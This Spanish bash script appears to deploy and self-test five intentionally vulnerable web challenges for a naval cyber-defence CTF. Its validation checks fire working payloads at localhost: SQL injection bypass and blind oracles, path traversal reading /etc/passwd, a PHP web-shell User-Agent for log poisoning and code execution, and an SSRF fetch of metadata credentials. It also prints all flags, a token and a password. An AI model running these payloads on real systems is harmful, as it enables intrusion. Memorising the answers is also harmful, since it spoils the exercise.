#!/bin/bash
# =============================================================================
# CTF MGP — SCRIPT MAESTRO: Despliegue completo de retos WEB (1–5)
# Ejecutar como root en el ServerCTF (192.168.125.150)
# Uso: sudo bash deploy_web_all.sh
# =============================================================================

VERDE="\e[32m"
AMARILLO="\e[33m"
ROJO="\e[31m"
AZUL="\e[34m"
NEGRITA="\e[1m"
RESET="\e[0m"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# ---------- Función de banner ----------
banner() {
    echo ""
    echo -e "${AZUL}${NEGRITA}╔══════════════════════════════════════════════════════════════╗${RESET}"
    echo -e "${AZUL}${NEGRITA}║   CTF COMCIBERDEF — Despliegue Retos WEB (1-5)               ║${RESET}"
    echo -e "${AZUL}${NEGRITA}║   Marina de Guerra del Perú — 2026                           ║${RESET}"
    echo -e "${AZUL}${NEGRITA}╚══════════════════════════════════════════════════════════════╝${RESET}"
    echo ""
}

# ---------- Verificar que se ejecuta como root ----------
check_root() {
    if [ "$EUID" -ne 0 ]; then
        echo -e "${ROJO}[ERROR] Este script debe ejecutarse como root${RESET}"
        echo -e "        Usa: sudo bash $0"
        exit 1
    fi
}

# ---------- Habilitar módulos Apache necesarios ----------
setup_apache_base() {
    echo -e "${AMARILLO}[*] Configurando Apache base...${RESET}"
    apt-get update -qq
    apt-get install -y -qq apache2 php libapache2-mod-php php-mysql \
                           php-curl mysql-server curl iptables

    a2enmod php* rewrite headers 2>/dev/null || true
    systemctl enable apache2 mysql
    systemctl start  apache2 mysql
    echo -e "${VERDE}    [OK] Apache + PHP + MySQL listos${RESET}"
}

# ---------- Ejecutar script individual ----------
run_reto() {
    local NUMERO="$1"
    local NOMBRE="$2"
    local SCRIPT="$3"

    echo ""
    echo -e "${AZUL}${NEGRITA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
    echo -e "${AZUL}${NEGRITA}  Desplegando RETO $NUMERO — $NOMBRE${RESET}"
    echo -e "${AZUL}${NEGRITA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"

    if [ ! -f "$SCRIPT_DIR/$SCRIPT" ]; then
        echo -e "${ROJO}    [ERROR] Archivo $SCRIPT no encontrado en $SCRIPT_DIR${RESET}"
        return 1
    fi

    chmod +x "$SCRIPT_DIR/$SCRIPT"
    bash "$SCRIPT_DIR/$SCRIPT"
}

# =============================================================================
# VALIDACIÓN FINAL — comprueba todos los retos desplegados
# =============================================================================
validacion_final() {
    echo ""
    echo -e "${AZUL}${NEGRITA}╔══════════════════════════════════════════════════════════════╗${RESET}"
    echo -e "${AZUL}${NEGRITA}║               VALIDACIÓN FINAL DE TODOS LOS RETOS           ║${RESET}"
    echo -e "${AZUL}${NEGRITA}╚══════════════════════════════════════════════════════════════╝${RESET}"
    echo ""

    PASS=0
    FAIL=0

    check() {
        local DESCRIPCION="$1"
        local RESULTADO="$2"   # 0=OK, otro=FAIL
        if [ "$RESULTADO" -eq 0 ]; then
            echo -e "  ${VERDE}[OK]${RESET}   $DESCRIPCION"
            PASS=$((PASS+1))
        else
            echo -e "  ${ROJO}[FAIL]${RESET} $DESCRIPCION"
            FAIL=$((FAIL+1))
        fi
    }

    echo -e "${AMARILLO}── Reto 1: SQLi Login ──────────────────────────────────────────${RESET}"

    # HTTP 200 en página de login
    CODE=$(curl -s -o /dev/null -w "%{http_code}" \
           "http://localhost/sqli-login/" 2>/dev/null || echo "000")
    [ "$CODE" = "200" ]; check "Portal /sqli-login/ accesible (HTTP $CODE)" $?

    # DB tiene 5 filas
    ROWS=$(mysql -u root -e "SELECT COUNT(*) FROM sqli_db.users;" -sN 2>/dev/null || echo 0)
    [ "$ROWS" -eq 5 ]; check "Tabla sqli_db.users tiene $ROWS filas (esperado 5)" $?

    # Bypass con SQLi → redirige al dashboard
    BYPASS=$(curl -s -L \
        --data "username=%27+OR+1%3D1+LIMIT+4%2C1+--+-&password=x" \
        "http://localhost/sqli-login/" 2>/dev/null | \
        grep -c "Comciberdef{sqli_bypass_2026_ok}" || echo 0)
    [ "$BYPASS" -gt 0 ]; check "SQLi bypass devuelve flag" $?

    echo ""
    echo -e "${AMARILLO}── Reto 2: XSS Reflejado ───────────────────────────────────────${RESET}"

    # Puerto 8080 activo
    CODE=$(curl -s -o /dev/null -w "%{http_code}" \
           "http://localhost:8080/xss/" 2>/dev/null || echo "000")
    [ "$CODE" = "200" ]; check "Portal :8080/xss/ accesible (HTTP $CODE)" $?

    # search.php refleja input
    REFLECT=$(curl -s "http://localhost:8080/xss/search.php?query=TESTMARKER" \
               2>/dev/null | grep -c "TESTMARKER" || echo 0)
    [ "$REFLECT" -gt 0 ]; check "search.php refleja input sin escapar" $?

    # Cookie con flag presente
    COOKIE=$(curl -sI "http://localhost:8080/xss/search.php?query=x" \
              2>/dev/null | grep -c "session_flag=Comciberdef" || echo 0)
    [ "$COOKIE" -gt 0 ]; check "Cookie session_flag con flag presente" $?

    echo ""
    echo -e "${AMARILLO}── Reto 3: SQLi Ciega ───────────────────────────────────────────${RESET}"

    # HTTP 200
    CODE=$(curl -s -o /dev/null -w "%{http_code}" \
           "http://localhost/sqli-blind/" 2>/dev/null || echo "000")
    [ "$CODE" = "200" ]; check "Portal /sqli-blind/ accesible (HTTP $CODE)" $?

    # Oráculo TRUE
    TRUE_R=$(curl -s "http://localhost/sqli-blind/?id=1+AND+1%3D1" \
              2>/dev/null | grep -c "encontrado" || echo 0)
    [ "$TRUE_R" -gt 0 ]; check "Oráculo booleano TRUE (AND 1=1 → encontrado)" $?

    # Oráculo FALSE
    FALSE_R=$(curl -s "http://localhost/sqli-blind/?id=1+AND+1%3D2" \
               2>/dev/null | grep -c "no disponible" || echo 0)
    [ "$FALSE_R" -gt 0 ]; check "Oráculo booleano FALSE (AND 1=2 → no disponible)" $?

    # Hash en BD
    HASH=$(mysql -u root -e \
           "SELECT password_hash FROM blind_db.moderators WHERE username='paco_admin';" \
           -sN 2>/dev/null || echo "")
    EXPECTED=$(echo -n "NavalCiber2026" | md5sum | cut -d' ' -f1)
    [ "$HASH" = "$EXPECTED" ]; check "Hash MD5 de paco_admin correcto en BD" $?

    # Wordlist contiene la contraseña
    WL_HIT=$(grep -c "NavalCiber2026" /home/rangeadmin/wordlist.txt 2>/dev/null || echo 0)
    [ "$WL_HIT" -gt 0 ]; check "Wordlist contiene NavalCiber2026" $?

    echo ""
    echo -e "${AMARILLO}── Reto 4: LFI + Log Poisoning ─────────────────────────────────${RESET}"

    # HTTP 200
    CODE=$(curl -s -o /dev/null -w "%{http_code}" \
           "http://localhost/lfi/" 2>/dev/null || echo "000")
    [ "$CODE" = "200" ]; check "Portal /lfi/ accesible (HTTP $CODE)" $?

    # LFI básico — /etc/passwd
    ETC=$(curl -s "http://localhost/lfi/?page=../../../etc/passwd" \
           2>/dev/null | grep -c "root" || echo 0)
    [ "$ETC" -gt 0 ]; check "LFI básico lee /etc/passwd" $?

    # Log existe y es escribible por www-data
    LOG_EXISTS=1
    [ -f /var/log/app/access.log ] && LOG_EXISTS=0
    check "Archivo /var/log/app/access.log existe" "$LOG_EXISTS"

    LOG_WRITABLE=1
    sudo -u www-data test -w /var/log/app/access.log 2>/dev/null && LOG_WRITABLE=0
    check "/var/log/app/access.log escribible por www-data" "$LOG_WRITABLE"

    # Flag existe
    FLAG_EXISTS=1
    [ -f /flag.txt ] && FLAG_EXISTS=0
    check "Archivo /flag.txt existe" "$FLAG_EXISTS"

    # Cadena completa: envenenar y ejecutar
    curl -s -A '<?php system($_GET["cmd"]); ?>' \
         "http://localhost/lfi/?page=home" > /dev/null 2>&1
    sleep 0.5
    RCE=$(curl -s "http://localhost/lfi/?page=/var/log/app/access.log&cmd=cat+/flag.txt" \
           2>/dev/null | grep -c "Comciberdef" || echo 0)
    [ "$RCE" -gt 0 ]; check "Log Poisoning + RCE lee /flag.txt" $?

    # Limpiar log post-test
    cat > /var/log/app/access.log <<'LOGEOF'
[2026-01-15 08:12:04] 192.168.125.40 GET /lfi/?page=home "Mozilla/5.0 (Windows NT 10.0)" 200
[2026-01-15 08:13:22] 192.168.125.50 GET /lfi/?page=news "Mozilla/5.0 (X11; Linux)" 200
LOGEOF
    chown www-data:www-data /var/log/app/access.log

    echo ""
    echo -e "${AMARILLO}── Reto 5: SSRF ─────────────────────────────────────────────────${RESET}"

    # Servicios systemd activos
    META_UP=$(systemctl is-active ctf-metadata 2>/dev/null || echo "inactive")
    [ "$META_UP" = "active" ]; check "Servicio ctf-metadata activo (Flask :8888)" $?

    STOR_UP=$(systemctl is-active ctf-storage 2>/dev/null || echo "inactive")
    [ "$STOR_UP" = "active" ]; check "Servicio ctf-storage activo (Flask :9999)" $?

    # Puerto 8080 externo bloqueado para SSRF (metadata en 8888 solo desde lo)
    META_EXT=$(curl -s -o /dev/null -w "%{http_code}" --interface eth0 \
               "http://127.0.0.1:8888/" 2>/dev/null || echo "000")
    # Solo verificamos que el servicio responde desde localhost
    META_LOC=$(curl -s -o /dev/null -w "%{http_code}" \
               "http://0.0.0.0:8888/" 2>/dev/null || echo "000")
    [ "$META_LOC" = "200" ]; check "Metadata :8888 accesible desde localhost" $?

    # Storage exige auth
    STOR_401=$(curl -s -o /dev/null -w "%{http_code}" \
               "http://0.0.0.0:9999/secret/flag.txt" 2>/dev/null || echo "000")
    [ "$STOR_401" = "401" ]; check "Storage :9999 requiere token (401)" $?

    # Storage entrega flag con token
    TOKEN="MGP2026-IAM-xK9mN3pQ7rT1vY5wZ8"
    STOR_OK=$(curl -s -H "Authorization: Bearer $TOKEN" \
              "http://0.0.0.0:9999/secret/flag.txt" 2>/dev/null | \
              grep -c "Comciberdef{ssrf_bypass_2026_master}" || echo 0)
    [ "$STOR_OK" -gt 0 ]; check "Storage entrega flag con token correcto" $?

    # SSRF bypass funciona con 0.0.0.0
    SSRF_OK=$(curl -s "http://localhost/ssrf/preview.php?url=http://0.0.0.0:8888/latest/meta-data/iam/security-credentials/mgp-role" \
               2>/dev/null | grep -c "Token" || echo 0)
    [ "$SSRF_OK" -gt 0 ]; check "SSRF bypass con 0.0.0.0 obtiene token" $?

    # Portal accesible
    CODE=$(curl -s -o /dev/null -w "%{http_code}" \
           "http://localhost/ssrf/" 2>/dev/null || echo "000")
    [ "$CODE" = "200" ]; check "Portal /ssrf/ accesible (HTTP $CODE)" $?

    # ==========================================================================
    # RESUMEN FINAL
    # ==========================================================================
    echo ""
    TOTAL=$((PASS+FAIL))
    echo -e "${AZUL}${NEGRITA}══════════════════════════════════════════════════════════════${RESET}"
    echo -e "${NEGRITA}  RESULTADO: $PASS/$TOTAL controles pasados${RESET}"
    if [ "$FAIL" -eq 0 ]; then
        echo -e "${VERDE}${NEGRITA}  ✓ TODOS LOS RETOS WEB ESTÁN CORRECTAMENTE DESPLEGADOS${RESET}"
    else
        echo -e "${ROJO}${NEGRITA}  ✗ $FAIL controles fallaron — revisar logs arriba${RESET}"
    fi
    echo -e "${AZUL}${NEGRITA}══════════════════════════════════════════════════════════════${RESET}"

    echo ""
    echo -e "${NEGRITA}  RESUMEN DE ACCESO PARA PARTICIPANTES:${RESET}"
    echo ""
    echo -e "  ${AMARILLO}Reto 1${RESET} — SQLi Login (Básico)"
    echo -e "           http://192.168.125.150/sqli-login/"
    echo -e "           Flag: Comciberdef{sqli_bypass_2026_ok}"
    echo ""
    echo -e "  ${AMARILLO}Reto 2${RESET} — XSS Reflejado (Básico)"
    echo -e "           http://192.168.125.150:8080/xss/"
    echo -e "           Flag: Comciberdef{xss_reflected_2026_found}"
    echo ""
    echo -e "  ${AMARILLO}Reto 3${RESET} — SQLi Ciega (Intermedio)"
    echo -e "           http://192.168.125.150/sqli-blind/"
    echo -e "           Flag: Comciberdef{NavalCiber2026}"
    echo ""
    echo -e "  ${AMARILLO}Reto 4${RESET} — LFI + Log Poisoning (Intermedio)"
    echo -e "           http://192.168.125.150/lfi/"
    echo -e "           Flag: Comciberdef{lfi_log_poison_rce_2026}"
    echo ""
    echo -e "  ${AMARILLO}Reto 5${RESET} — SSRF + Bypass (Avanzado)"
    echo -e "           http://192.168.125.150/ssrf/"
    echo -e "           Flag: Comciberdef{ssrf_bypass_2026_master}"
    echo ""
    echo -e "${AZUL}${NEGRITA}══════════════════════════════════════════════════════════════${RESET}"
}

# =============================================================================
# MAIN — Ejecución en orden
# =============================================================================
banner
check_root
setup_apache_base

run_reto 1 "SQL Injection Login"      "reto1_sqli_login.sh"
run_reto 2 "XSS Reflejado"            "reto2_xss.sh"
run_reto 3 "SQL Injection Ciega"      "reto3_sqli_blind.sh"
run_reto 4 "LFI + Log Poisoning"      "reto4_lfi.sh"
run_reto 5 "SSRF + Bypass de Filtros" "reto5_ssrf.sh"

systemctl restart apache2
validacion_final
